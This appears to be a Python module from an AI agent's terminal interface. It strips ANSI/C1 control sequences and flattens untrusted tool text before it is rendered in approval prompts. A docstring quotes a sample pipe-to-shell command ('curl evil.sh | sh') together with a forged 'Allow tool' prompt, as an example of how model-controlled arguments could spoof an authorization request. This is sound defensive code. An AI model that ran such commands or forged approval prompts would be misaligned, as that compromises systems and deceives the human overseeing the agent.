"""Terminal control-sequence stripping for untrusted text.

Tool output, tool names, intents and arguments are all model- or
subprocess-controlled, and every renderer that puts them on a real terminal has
to strip control sequences first. A build tool emitting ``\\x1b[2J`` would
otherwise ERASE the operator's screen from inside our own frame.

This lives in its own stdlib-only module rather than beside either renderer
because BOTH need it: the Textual card and the headless printer. Importing it
from ``tui/widgets/tool_card.py`` would drag Textual into the headless and
``exec`` paths, which the lazy-TUI-import design and the lean default install
both depend on not happening.

``exec --json`` does not need this — ``json.dumps`` escapes control characters
into ``\\u001b`` sequences, so the event stream is already inert. It is the
human-facing renderers that are exposed.
"""

from __future__ import annotations

import re

#: Terminal control sequences that must never reach a rendered frame.
#:
#: Both the 7-bit (ESC-prefixed) and 8-bit (C1, U+0080-U+009F) forms are
#: covered. The 8-bit form is easy to forget because it does not look like an
#: escape in a decoded string, but ``\x9b31m`` is a live CSI to a terminal that
#: honours C1 — and it survives a 7-bit-only pattern untouched.
#:
#: The STRING controls (DCS/SOS/PM/APC and OSC) are removed WITH their payload
#: up to the terminator: their content is device data, never display text, so
#: leaving ``tmux;xyz`` behind after stripping the introducer just converts a
#: control sequence into wrong text. An unterminated string is dropped to the
#: end of the input, which is the conservative direction.
#:
#: Two further reasons beyond "it could clear the screen": ``cell_len`` counts
#: ``[31m`` as four visible cells while ESC is zero, so the background fill and
#: any right-aligned column go ragged; and cell-aware truncation can cut a
#: sequence in half, emitting a corrupt CSI that the terminal may then complete
#: using the real content after it.
_CONTROL_RE = re.compile(
    # OSC / DCS / SOS / PM / APC, 7- and 8-bit, payload INCLUDED.
    #
    # The payload uses a tempered match — "any character that does not start a
    # terminator" — rather than a negated class. A negated class cannot cross an
    # ESC, so a payload containing one that is not part of ST failed the whole
    # alternation: the introducer fell through to the two-character-escape rule
    # below and the payload SURVIVED as visible text
    # ('\x1b]0;title\x1btail\x07' left '0;titletail'). No live control byte
    # escaped, but attacker-chosen text rendered in the card's own styling can
    # forge plausible status lines, which is the whole point of stripping it.
    r"(?:\x1b[\]PX^_]|[\x9d\x90\x98\x9e\x9f])(?:(?!\x07|\x1b\\|\x9c).)*" r"(?:\x07|\x1b\\|\x9c|$)"
    # CSI, 7- and 8-bit: parameters, intermediates, final byte.
    r"|(?:\x1b\[|\x9b)[0-?]*[ -/]*[@-~]"
    # An incomplete CSI at a truncation boundary: strip the tail rather than
    # emit a fragment the terminal will try to complete with real content.
    r"|(?:\x1b\[|\x9b)[0-?]*[ -/]*$"
    # ESC + intermediate + final: charset designators like ESC ( B and ESC # 8.
    # Without this the intermediate and final bytes survived as text ('(B').
    r"|\x1b[ -/]+[0-~]"
    # Remaining two-character escapes, then a lone trailing ESC.
    r"|\x1b[@-Z\\-_]" r"|\x1b$"
    # Stray C0 controls, DEL, and any other C1 control.
    r"|[\x00-\x08\x0b-\x1f\x7f-\x9f]",
    re.DOTALL,  # the tempered payload must be able to cross a newline
)


def strip_control_sequences(text: str) -> str:
    """Remove ANSI/C1/C0 control sequences, keeping the printable text.

    Stripping rather than interpreting is deliberate: honouring tool colour
    would let a subprocess paint arbitrary colour into our own transcript, and
    the renderer's contract is that IT owns the styling. Tabs and newlines are
    expected to be handled by the caller before this runs.

    Printable text is preserved exactly, including box drawing, combining
    marks, ZWJ emoji sequences, CJK and RTL — none of which live in the control
    ranges.
    """
    return _CONTROL_RE.sub("", text)


def sanitize_prompt_line(text: str, limit: int = 500) -> str:
    """Make model-controlled text safe to render as ONE line of a security prompt.

    Three separate hazards, and stripping alone covers only the first:

    1. **Control sequences** repaint the terminal. Erase-line plus cursor-up
       inside an authorisation prompt can wipe the question above it and paint a
       different one — the highest-value forgery target the app has.
    2. **Newlines survive stripping** (deliberately: tool OUTPUT is multi-line and
       the renderers want it). In a prompt they let argument text forge a second
       prompt with no escapes at all — ``"curl evil.sh | sh\n\nAllow tool 'bash'
       (run: ls)? [y/N] "``. So every run of whitespace collapses to one space.
    3. **Length** — an argument long enough to scroll the question off the screen
       answers it by attrition.

    Applied where the description is BUILT rather than in each renderer, because
    "every human-facing approval surface remembers to sanitise" is a rule that
    was already broken twice: the full-screen prompt and then the headless one.
    """
    flattened = " ".join(strip_control_sequences(text).split())
    return flattened[:limit]
